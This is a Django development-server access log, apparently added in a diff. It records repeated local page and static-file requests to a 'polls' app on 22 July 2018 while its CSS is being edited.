+[22/Jul/2018 10:00:18] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:18] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:32] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:32] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 10:00:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:02:11] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:02:11] "GET /static/polls/style_home.css HTTP/1.1" 200 994
+[22/Jul/2018 10:02:11] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:02:45] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:02:45] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 10:02:57] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:02:57] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 10:03:33] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:03:33] "GET /static/polls/style_home.css HTTP/1.1" 200 974
+[22/Jul/2018 10:04:00] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:04:00] "GET /static/polls/style_home.css HTTP/1.1" 200 946
+[22/Jul/2018 10:04:02] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:04:02] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:04:03] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:04:03] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:04:17] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:04:17] "GET /static/polls/style_home.css HTTP/1.1" 200 925
+[22/Jul/2018 10:05:27] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:05:27] "GET /static/polls/style_home.css HTTP/1.1" 200 974
+[22/Jul/2018 10:05:43] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:05:43] "GET /static/polls/style_home.css HTTP/1.1" 200 975
+[22/Jul/2018 10:05:50] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:05:50] "GET /static/polls/style_home.css HTTP/1.1" 200 975
+[22/Jul/2018 10:06:15] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:06:15] "GET /static/polls/style_home.css HTTP/1.1" 200 979
+[22/Jul/2018 10:07:15] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:15] "GET /static/polls/style_home.css HTTP/1.1" 200 1000
+[22/Jul/2018 10:07:16] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:16] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:07:17] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:17] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:07:17] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:17] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:07:18] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:18] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:07:21] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:07:25] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:07:25] "GET /static/polls/style_home.css HTTP/1.1" 200 1000
+[22/Jul/2018 10:07:25] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:08:42] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:08:42] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:08:42] "GET /static/polls/style_home.css HTTP/1.1" 200 1000
+[22/Jul/2018 10:09:01] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:09:01] "GET /static/polls/style_home.css HTTP/1.1" 200 1000
+[22/Jul/2018 10:09:01] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:12:21] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:12:21] "GET /static/polls/style_home.css HTTP/1.1" 200 993
+[22/Jul/2018 10:12:21] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:06] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:07] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:07] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:07] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:08] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:09] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:09] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:09] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:10] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:38] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:38] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:38] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:39] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:39] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:13:39] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:13:39] "GET /static/polls/style_home.css HTTP/1.1" 200 1014
+[22/Jul/2018 10:13:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:15:33] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:15:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 10:15:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:15:54] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:15:54] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 10:15:54] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:16:06] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:16:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 10:16:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:16:19] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 10:19:06] "GET /polls/home/ HTTP/1.1" 200 2126
+[22/Jul/2018 10:19:06] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 10:19:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:19:37] "GET /polls/home/ HTTP/1.1" 200 2097
+[22/Jul/2018 10:19:37] "GET /static/polls/style_home.css HTTP/1.1" 200 1020
+[22/Jul/2018 10:19:37] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:20:16] "GET /polls/home/ HTTP/1.1" 200 2126
+[22/Jul/2018 10:20:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:20:16] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:20:32] "GET /polls/home/ HTTP/1.1" 200 2126
+[22/Jul/2018 10:20:32] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:20:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:20:33] "GET /polls/home/ HTTP/1.1" 200 2126
+[22/Jul/2018 10:20:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:20:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:21:00] "GET /polls/home/ HTTP/1.1" 200 2126
+[22/Jul/2018 10:21:00] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:21:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:21:12] "GET /polls/home/ HTTP/1.1" 200 2097
+[22/Jul/2018 10:21:12] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:21:12] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:25:16] "GET /polls/home/ HTTP/1.1" 200 2096
+[22/Jul/2018 10:25:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:25:16] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:26:12] "GET /polls/home/ HTTP/1.1" 200 2096
+[22/Jul/2018 10:26:12] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:26:12] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:26:58] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:26:58] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:26:58] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:02] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:27:02] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:03] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:03] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:03] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:27:03] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:03] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:03] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:27:04] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:04] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:27:06] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:06] "GET /static/polls/style_home.css HTTP/1.1" 200 999
+[22/Jul/2018 10:27:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:27:10] "GET /polls/home/ HTTP/1.1" 200 2125
+[22/Jul/2018 10:27:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:27:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:28:04] "GET /polls/home/ HTTP/1.1" 200 2073
+[22/Jul/2018 10:28:04] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:28:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:29:59] "GET /polls/home/ HTTP/1.1" 200 2189
+[22/Jul/2018 10:29:59] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:29:59] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:31:39] "GET /polls/home/ HTTP/1.1" 200 2359
+[22/Jul/2018 10:31:39] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:31:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:32:06] "GET /polls/home/ HTTP/1.1" 200 2350
+[22/Jul/2018 10:32:07] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:32:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:32:45] "GET /polls/home/ HTTP/1.1" 200 2195
+[22/Jul/2018 10:32:45] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:32:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:34:01] "GET /polls/home/ HTTP/1.1" 200 2202
+[22/Jul/2018 10:34:01] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:34:01] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:34:20] "GET /polls/home/ HTTP/1.1" 200 2202
+[22/Jul/2018 10:34:20] "GET /static/polls/style_home.css HTTP/1.1" 200 1031
+[22/Jul/2018 10:34:20] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:35:07] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:35:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:35:07] "GET /static/polls/style_home.css HTTP/1.1" 200 1030
+[22/Jul/2018 10:35:20] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:35:20] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:35:20] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:35:21] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:35:21] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:35:21] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:04] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:04] "GET /static/polls/style_home.css HTTP/1.1" 200 981
+[22/Jul/2018 10:36:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:18] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:18] "GET /static/polls/style_home.css HTTP/1.1" 200 981
+[22/Jul/2018 10:36:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:30] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:30] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:31] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:31] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:31] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:31] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:32] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:32] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:33] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:33] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:33] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:34] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:34] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:34] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:35] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:35] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:35] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:36] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:36] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:36:36] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:36:36] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:36:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:11] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:11] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:11] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:11] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:11] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:11] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:12] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:12] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:12] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:12] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:12] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:12] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:12] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:13] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:13] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:13] "GET /static/polls/style_home.css HTTP/1.1" 200 1002
+[22/Jul/2018 10:37:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:50] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:37:50] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:37:50] "GET /static/polls/style_home.css HTTP/1.1" 200 1004
+[22/Jul/2018 10:38:19] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:38:19] "GET /static/polls/style_home.css HTTP/1.1" 200 1028
+[22/Jul/2018 10:38:19] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:38:28] "GET /polls/home/ HTTP/1.1" 200 2220
+[22/Jul/2018 10:38:28] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:38:28] "GET /static/polls/style_home.css HTTP/1.1" 200 1028
+[22/Jul/2018 10:39:40] "GET /polls/home/ HTTP/1.1" 200 2166
+[22/Jul/2018 10:39:40] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:39:40] "GET /static/polls/style_home.css HTTP/1.1" 200 1067
+[22/Jul/2018 10:41:02] "GET /polls/home/ HTTP/1.1" 200 2121
+[22/Jul/2018 10:41:02] "GET /static/polls/style_home.css HTTP/1.1" 200 958
+[22/Jul/2018 10:41:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:41:52] "GET /polls/home/ HTTP/1.1" 200 2100
+[22/Jul/2018 10:41:52] "GET /static/polls/style_home.css HTTP/1.1" 200 958
+[22/Jul/2018 10:41:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:42:35] "GET /polls/home/ HTTP/1.1" 200 2100
+[22/Jul/2018 10:42:35] "GET /static/polls/style_home.css HTTP/1.1" 200 996
+[22/Jul/2018 10:42:35] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:42:57] "GET /polls/home/ HTTP/1.1" 200 2100
+[22/Jul/2018 10:42:58] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:42:58] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 10:44:32] "GET /polls/home/ HTTP/1.1" 200 2189
+[22/Jul/2018 10:44:32] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 10:44:32] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:09:53] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:09:53] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[22/Jul/2018 11:09:53] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:11:58] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:11:58] "GET /static/polls/style_home.css HTTP/1.1" 200 946
+[22/Jul/2018 11:11:58] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:12:58] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:12:58] "GET /static/polls/style_home.css HTTP/1.1" 200 1004
+[22/Jul/2018 11:12:58] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:13:05] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:13:05] "GET /static/polls/style_home.css HTTP/1.1" 200 1004
+[22/Jul/2018 11:13:05] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:13:38] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:13:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:13:39] "GET /static/polls/style_home.css HTTP/1.1" 200 1062
+[22/Jul/2018 11:14:44] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:14:44] "GET /static/polls/style_home.css HTTP/1.1" 200 1079
+[22/Jul/2018 11:14:44] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:14:52] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:14:52] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:14:52] "GET /static/polls/style_home.css HTTP/1.1" 200 1079
+[22/Jul/2018 11:15:10] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:15:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1079
+[22/Jul/2018 11:15:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:15:43] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:15:43] "GET /static/polls/style_home.css HTTP/1.1" 200 1119
+[22/Jul/2018 11:15:43] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:16:00] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:16:00] "GET /static/polls/style_home.css HTTP/1.1" 200 1119
+[22/Jul/2018 11:16:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:16:23] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:16:23] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:16:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:16:34] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:16:34] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:16:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:16:44] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:16:44] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:16:44] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:17:18] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:17:18] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:17:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:17:48] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:17:48] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:17:48] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:18:14] "GET /polls/home/ HTTP/1.1" 200 2122
+[22/Jul/2018 11:18:14] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:18:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[22/Jul/2018 11:21:22] "GET / HTTP/1.1" 404 2030
+[22/Jul/2018 11:22:10] "GET /polls/home/ HTTP/1.1" 200 2135
+[22/Jul/2018 11:22:10] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:22:10] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:22:30] "GET /polls/home/ HTTP/1.1" 200 2150
+[22/Jul/2018 11:22:30] "GET /static/polls/style_home.css HTTP/1.1" 200 1137
+[22/Jul/2018 11:22:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:23:17] "GET /polls/home/ HTTP/1.1" 200 2150
+[22/Jul/2018 11:23:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:23:18] "GET /static/polls/style_home.css HTTP/1.1" 200 1116
+[22/Jul/2018 11:24:14] "GET /polls/home/ HTTP/1.1" 200 2150
+[22/Jul/2018 11:24:14] "GET /static/polls/style_home.css HTTP/1.1" 200 1125
+[22/Jul/2018 11:24:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:25:44] "GET /polls/home/ HTTP/1.1" 200 2150
+[22/Jul/2018 11:25:45] "GET /static/polls/style_home.css HTTP/1.1" 200 1104
+[22/Jul/2018 11:25:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:27:50] "GET /polls/home/ HTTP/1.1" 200 2138
+[22/Jul/2018 11:27:50] "GET /static/polls/style_home.css HTTP/1.1" 200 1104
+[22/Jul/2018 11:27:50] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:29:22] "GET /polls/home/ HTTP/1.1" 200 2138
+[22/Jul/2018 11:29:22] "GET /static/polls/style_home.css HTTP/1.1" 200 1165
+[22/Jul/2018 11:29:22] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:30:02] "GET /polls/home/ HTTP/1.1" 200 2138
+[22/Jul/2018 11:30:03] "GET /static/polls/style_home.css HTTP/1.1" 200 1188
+[22/Jul/2018 11:30:03] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:30:14] "GET /polls/home/ HTTP/1.1" 200 2138
+[22/Jul/2018 11:30:14] "GET /static/polls/style_home.css HTTP/1.1" 200 1187
+[22/Jul/2018 11:30:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:32:25] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[22/Jul/2018 11:33:46] "GET /polls/home/ HTTP/1.1" 200 2153
+[22/Jul/2018 11:33:46] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[22/Jul/2018 11:33:46] "GET /static/polls/style_home.css HTTP/1.1" 200 1247
+[22/Jul/2018 11:34:16] "GET /polls/home/ HTTP/1.1" 200 2153
+[22/Jul/2018 11:34:16] "GET /static/polls/style_home.css HTTP/1.1" 200 1269
